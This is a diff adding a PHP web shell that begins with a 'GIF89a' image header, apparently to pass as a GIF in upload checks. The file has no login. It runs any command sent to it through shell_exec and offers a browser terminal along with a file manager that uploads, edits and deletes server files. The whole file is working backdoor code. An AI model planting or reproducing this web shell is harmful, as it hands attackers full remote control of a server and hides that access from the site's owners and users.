@@ -1,0 +1,612 @@
+GIF89a<?php
+
+function escapetext($text) {
+    return str_replace("\n", "<br>", htmlentities($text));
+}
+
+function exec_command($cmd, $internal = false) {
+    try {
+        $shell_exec = shell_exec($cmd);
+    } catch (Exception $e) {
+        if ($internal === true) {
+            return $e->getMessage();
+        } else {
+            return json_encode([
+                'status' => 'error',
+                'response' => $e->getMessage()
+            ]);
+        }
+    }
+
+    if ($internal === true) {
+        return $shell_exec;
+    } else {
+        return json_encode([
+            'status' => 'ok',
+            'response' => escapetext($shell_exec)
+        ]);
+    }
+}
+
+// File Manager Operations
+$fm_message = '';
+$current_dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
+$current_dir = realpath($current_dir) ?: __DIR__;
+
+// File Upload
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
+    $target = $current_dir . '/' . basename($_FILES['upload_file']['name']);
+    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
+        $fm_message = 'Uploaded: ' . basename($target);
+    } else {
+        $fm_message = 'Upload failed';
+    }
+}
+
+// File Delete
+if (isset($_GET['delete'])) {
+    $file = $current_dir . '/' . basename($_GET['delete']);
+    if (is_file($file) && unlink($file)) {
+        $fm_message = 'Deleted: ' . basename($file);
+    }
+}
+
+// File Edit - Save
+if (isset($_POST['save_file']) && isset($_POST['file_content']) && isset($_POST['edit_file'])) {
+    $file = $current_dir . '/' . basename($_POST['edit_file']);
+    if (is_file($file) && is_writable($file)) {
+        file_put_contents($file, $_POST['file_content']);
+        $fm_message = 'Saved: ' . basename($file);
+    }
+}
+
+// Get file to edit
+$edit_file = isset($_GET['edit']) ? $current_dir . '/' . basename($_GET['edit']) : null;
+$file_content = '';
+if ($edit_file && is_file($edit_file) && is_readable($edit_file)) {
+    $file_content = file_get_contents($edit_file);
+}
+
+// Directory contents
+$items = scandir($current_dir);
+
+$postdata = json_decode(file_get_contents('php://input'));
+
+if (!is_null($postdata) && isset($postdata->cmd)) {
+    die(exec_command($postdata->cmd));
+}
+
+try {
+    $hostvars = exec_command('whoami && hostname && pwd', true);
+
+    list($whoami, $hostname, $pwd) = explode("\n", $hostvars);
+
+    if (!$whoami) {
+        throw new Exception('Could not execute `whoami`');
+    }
+
+    if (!$hostname) {
+        throw new Exception('Could not execute `hostname`');
+    }
+
+    if (!$pwd) {
+        throw new Exception('Could not execute `pwd`');
+    }
+} catch (Exception $e) {
+    $errormsg = $e->getMessage();
+}
+
+?>
+<!doctype html>
+<html>
+<head>
+    <title>PHP Interactive Shell</title>
+    <style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+    body {
+        background: #0d1117;
+        color: #c9d1d9;
+        font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+        height: 100vh;
+        overflow: hidden;
+        display: flex;
+        flex-direction: column;
+    }
+
+    /* FILE MANAGER */
+    #filemanager {
+        flex: 1;
+        padding: 16px 20px;
+        overflow-y: auto;
+        border-bottom: 1px solid #21262d;
+        min-height: 200px;
+        max-height: 55vh;
+    }
+
+    .fm-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 12px;
+        flex-wrap: wrap;
+        gap: 8px;
+    }
+
+    .fm-title {
+        font-size: 13px;
+        font-weight: 600;
+        color: #58a6ff;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }
+
+    .fm-path {
+        font-size: 12px;
+        color: #8b949e;
+        background: #161b22;
+        padding: 4px 12px;
+        border-radius: 4px;
+        border: 1px solid #21262d;
+    }
+
+    .fm-actions {
+        display: flex;
+        gap: 8px;
+        flex-wrap: wrap;
+    }
+
+    .fm-btn {
+        background: #21262d;
+        border: 1px solid #30363d;
+        color: #c9d1d9;
+        padding: 4px 14px;
+        border-radius: 4px;
+        font-size: 12px;
+        cursor: pointer;
+        font-family: inherit;
+        transition: 0.15s;
+    }
+    .fm-btn:hover {
+        background: #30363d;
+    }
+    .fm-btn-primary {
+        background: #238636;
+        border-color: #238636;
+        color: #fff;
+    }
+    .fm-btn-primary:hover {
+        background: #2ea043;
+    }
+    .fm-btn-danger {
+        color: #f85149;
+        border-color: #f85149;
+    }
+    .fm-btn-danger:hover {
+        background: #f85149;
+        color: #fff;
+    }
+
+    .fm-message {
+        padding: 6px 12px;
+        border-radius: 4px;
+        font-size: 12px;
+        margin-bottom: 10px;
+        background: #161b22;
+        color: #8b949e;
+        border-left: 3px solid #58a6ff;
+    }
+    .fm-message.error {
+        border-left-color: #f85149;
+        color: #f85149;
+    }
+    .fm-message.success {
+        border-left-color: #238636;
+        color: #238636;
+    }
+
+    .fm-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 16px;
+    }
+
+    .fm-panel {
+        background: #161b22;
+        border: 1px solid #21262d;
+        border-radius: 6px;
+        padding: 12px 16px;
+    }
+
+    .fm-panel-title {
+        font-size: 11px;
+        font-weight: 600;
+        color: #8b949e;
+        text-transform: uppercase;
+        letter-spacing: 0.3px;
+        margin-bottom: 8px;
+    }
+
+    .fm-upload-row {
+        display: flex;
+        gap: 8px;
+        align-items: center;
+        flex-wrap: wrap;
+    }
+    .fm-upload-row input[type="file"] {
+        flex: 1;
+        min-width: 120px;
+        font-size: 12px;
+        color: #8b949e;
+        background: #0d1117;
+        border: 1px solid #21262d;
+        border-radius: 4px;
+        padding: 4px 8px;
+    }
+    .fm-upload-row input[type="file"]::file-selector-button {
+        background: #21262d;
+        border: none;
+        color: #c9d1d9;
+        padding: 4px 10px;
+        border-radius: 3px;
+        font-family: inherit;
+        font-size: 12px;
+        cursor: pointer;
+    }
+    .fm-upload-row input[type="file"]::file-selector-button:hover {
+        background: #30363d;
+    }
+
+    .fm-edit-area textarea {
+        width: 100%;
+        min-height: 100px;
+        background: #0d1117;
+        border: 1px solid #21262d;
+        border-radius: 4px;
+        color: #c9d1d9;
+        font-family: 'Consolas', monospace;
+        font-size: 12px;
+        padding: 8px;
+        resize: vertical;
+        margin-bottom: 6px;
+    }
+    .fm-edit-area textarea:focus {
+        outline: none;
+        border-color: #58a6ff;
+    }
+
+    .fm-file-list {
+        max-height: 200px;
+        overflow-y: auto;
+    }
+    .fm-file-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 4px 6px;
+        border-bottom: 1px solid #21262d;
+        font-size: 12px;
+        gap: 8px;
+    }
+    .fm-file-item:last-child {
+        border-bottom: none;
+    }
+    .fm-file-item .name {
+        color: #c9d1d9;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+        flex: 1;
+    }
+    .fm-file-item .name.folder {
+        color: #58a6ff;
+    }
+    .fm-file-item .size {
+        color: #8b949e;
+        font-size: 11px;
+        white-space: nowrap;
+    }
+    .fm-file-item .actions {
+        display: flex;
+        gap: 6px;
+        white-space: nowrap;
+    }
+    .fm-file-item .actions a {
+        color: #8b949e;
+        text-decoration: none;
+        font-size: 11px;
+        padding: 1px 6px;
+        border-radius: 3px;
+    }
+    .fm-file-item .actions a:hover {
+        background: #21262d;
+    }
+    .fm-file-item .actions a.edit-link {
+        color: #58a6ff;
+    }
+    .fm-file-item .actions a.delete-link {
+        color: #f85149;
+    }
+    .fm-empty {
+        color: #8b949e;
+        font-size: 12px;
+        padding: 16px;
+        text-align: center;
+    }
+
+    /* TERMINAL */
+    #terminal-wrapper {
+        flex-shrink: 0;
+        height: 45vh;
+        min-height: 150px;
+        display: flex;
+        flex-direction: column;
+        background: #0d1117;
+        border-top: 1px solid #21262d;
+    }
+
+    #terminal {
+        flex: 1;
+        padding: 10px 16px;
+        overflow-y: auto;
+        overflow-x: hidden;
+        white-space: pre-wrap;
+        word-break: break-all;
+        font-size: 13px;
+        line-height: 1.6;
+    }
+
+    #bottombar {
+        flex-shrink: 0;
+        display: flex;
+        align-items: center;
+        padding: 4px 16px 8px;
+        background: #0d1117;
+        border-top: 1px solid #21262d;
+    }
+
+    #ps1 {
+        color: #58a6ff;
+        padding-right: 8px;
+        white-space: nowrap;
+        font-size: 13px;
+    }
+
+    #cursor {
+        flex: 1;
+        background: transparent;
+        border: none;
+        color: #c9d1d9;
+        font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+        font-size: 13px;
+        outline: none;
+        padding: 4px 0;
+    }
+
+    /* Scrollbar */
+    ::-webkit-scrollbar {
+        width: 6px;
+        height: 6px;
+    }
+    ::-webkit-scrollbar-track {
+        background: #0d1117;
+    }
+    ::-webkit-scrollbar-thumb {
+        background: #30363d;
+        border-radius: 3px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+        background: #484f58;
+    }
+
+    @media (max-width: 768px) {
+        .fm-grid {
+            grid-template-columns: 1fr;
+        }
+        #filemanager {
+            max-height: 40vh;
+        }
+        #terminal-wrapper {
+            height: 60vh;
+        }
+    }
+    </style>
+</head>
+<body>
+
+<!-- FILE MANAGER -->
+<div id="filemanager">
+    <div class="fm-header">
+        <span class="fm-title">File Manager</span>
+        <span class="fm-path"><?= htmlspecialchars($current_dir) ?></span>
+        <div class="fm-actions">
+            <a href="?dir=<?= urlencode($current_dir . '/..') ?>" class="fm-btn">Parent</a>
+            <a href="?" class="fm-btn">Refresh</a>
+        </div>
+    </div>
+
+    <?php if ($fm_message): ?>
+        <div class="fm-message <?= strpos($fm_message, 'failed') !== false ? 'error' : (strpos($fm_message, 'Uploaded') !== false || strpos($fm_message, 'Deleted') !== false || strpos($fm_message, 'Saved') !== false ? 'success' : '') ?>">
+            <?= htmlspecialchars($fm_message) ?>
+        </div>
+    <?php endif; ?>
+
+    <div class="fm-grid">
+        <!-- Upload Panel -->
+        <div class="fm-panel">
+            <div class="fm-panel-title">Upload File</div>
+            <form method="post" enctype="multipart/form-data">
+                <div class="fm-upload-row">
+                    <input type="file" name="upload_file" required>
+                    <button type="submit" class="fm-btn fm-btn-primary">Upload</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Edit Panel -->
+        <div class="fm-panel">
+            <div class="fm-panel-title">Edit File</div>
+            <?php if ($edit_file && is_file($edit_file) && is_readable($edit_file)): ?>
+                <form method="post">
+                    <div class="fm-edit-area">
+                        <div style="font-size:11px;color:#8b949e;margin-bottom:4px;"><?= htmlspecialchars(basename($edit_file)) ?></div>
+                        <textarea name="file_content"><?= htmlspecialchars($file_content) ?></textarea>
+                        <input type="hidden" name="edit_file" value="<?= htmlspecialchars(basename($edit_file)) ?>">
+                        <button type="submit" name="save_file" class="fm-btn fm-btn-primary" style="width:100%;">Save</button>
+                    </div>
+                </form>
+            <?php else: ?>
+                <div style="color:#8b949e;font-size:12px;padding:8px 0;">Click "Edit" on a file below</div>
+            <?php endif; ?>
+        </div>
+    </div>
+
+    <!-- File List -->
+    <div class="fm-panel" style="margin-top:12px;">
+        <div class="fm-panel-title">Directory Contents</div>
+        <div class="fm-file-list">
+            <?php
+            $has_files = false;
+            foreach ($items as $item):
+                if ($item === '.' || $item === '..') continue;
+                $path = $current_dir . '/' . $item;
+                $is_dir = is_dir($path);
+                $has_files = true;
+            ?>
+                <div class="fm-file-item">
+                    <span class="name <?= $is_dir ? 'folder' : '' ?>">
+                        <?= $is_dir ? '📁' : '📄' ?> <?= htmlspecialchars($item) ?>
+                    </span>
+                    <span class="size"><?= $is_dir ? '' : number_format(filesize($path)) . ' B' ?></span>
+                    <span class="actions">
+                        <?php if ($is_dir): ?>
+                            <a href="?dir=<?= urlencode($path) ?>">Open</a>
+                        <?php else: ?>
+                            <a href="?edit=<?= urlencode($item) ?>" class="edit-link">Edit</a>
+                            <a href="?delete=<?= urlencode($item) ?>&dir=<?= urlencode($current_dir) ?>" class="delete-link" onclick="return confirm('Delete <?= htmlspecialchars($item) ?>?')">Delete</a>
+                        <?php endif; ?>
+                    </span>
+                </div>
+            <?php endforeach; ?>
+            <?php if (!$has_files): ?>
+                <div class="fm-empty">Directory is empty</div>
+            <?php endif; ?>
+        </div>
+    </div>
+</div>
+
+<!-- TERMINAL -->
+<div id="terminal-wrapper">
+    <div id="terminal"></div>
+    <div id="bottombar">
+        <span id="ps1"></span>
+        <input id="cursor" autofocus>
+    </div>
+</div>
+
+<script>
+class Terminal {
+    constructor() {
+        this.whoami = '<?php echo $whoami; ?>';
+        this.hostname = '<?php echo $hostname; ?>';
+        this.pwd = '<?php echo $pwd; ?>';
+        this.PATH_SEP = '/';
+        this.commandHistory = [];
+        this.commandHistoryIndex = this.commandHistory.length;
+
+        this.termWindow = document.getElementById('terminal');
+        this.cursor = document.getElementById('cursor');
+        this.ps1element = document.getElementById('ps1');
+
+        this.ps1element.innerHTML = this.ps1();
+        this.attachCursor();
+    }
+
+    formatPath(path) {
+        path = path.replace(/\//g, this.PATH_SEP);
+        let curPathArr = !path.match(/^(([A-Z]\:)|(\/))/) ? this.pwd.split(this.PATH_SEP) : [];
+        let pathArr = curPathArr.concat(path.split(this.PATH_SEP).filter(el => el));
+        let absPath = [];
+
+        pathArr.forEach(el => {
+            if (el === '.') {
+                // Do nothing
+            } else if (el === '..') {
+                absPath.pop();
+            } else {
+                absPath.push(el);
+            }
+        });
+
+        return this.PATH_SEP + (absPath.length === 1 ? absPath[0] + this.PATH_SEP : absPath.join(this.PATH_SEP));
+    }
+
+    getCurrentPath() {
+        return this.formatPath(this.pwd);
+    }
+
+    updateCurrentPath(newPath) {
+        this.pwd = this.formatPath(newPath);
+    }
+
+    attachCursor() {
+        this.cursor.addEventListener('keyup', ({keyCode}) => {
+            switch (keyCode) {
+                case 13:
+                    this.execCommand(this.cursor.value);
+                    this.cursor.value = '';
+                    this.ps1element.innerHTML = this.ps1();
+                    this.commandHistoryIndex = this.commandHistory.length;
+                    break;
+
+                case 38:
+                    if (this.commandHistoryIndex !== 0) {
+                        this.cursor.value = this.commandHistory[--this.commandHistoryIndex] || '';
+                    }
+                    break;
+
+                case 40:
+                    if (this.commandHistoryIndex < this.commandHistory.length) {
+                        this.cursor.value = this.commandHistory[++this.commandHistoryIndex] || '';
+                    }
+                    break;
+            }
+        });
+    }
+
+    ps1() {
+        return `<span style="color:orange">${this.whoami}@${this.hostname}</span>:` +
+            `<span style="color:limegreen">${this.getCurrentPath()}</span>$ `;
+    }
+
+    execCommand(cmd) {
+        this.commandHistory.push(cmd);
+
+        fetch(document.location.href, {
+            method: 'POST',
+            headers: new Headers({
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            }),
+            body: JSON.stringify({
+                cmd
+            })
+        }).then(
+            res => res.json(),
+            err => console.error(err)
+        ).then(({response}) => {
+            this.termWindow.innerHTML += `${this.ps1()}${cmd}<br>${response}`;
+            this.termWindow.scrollTop = this.termWindow.scrollHeight;
+        });
+    }
+}
+
+window.addEventListener('load', () => {
+    const terminal = new Terminal();
+});
+</script>
+</body>
+</html>
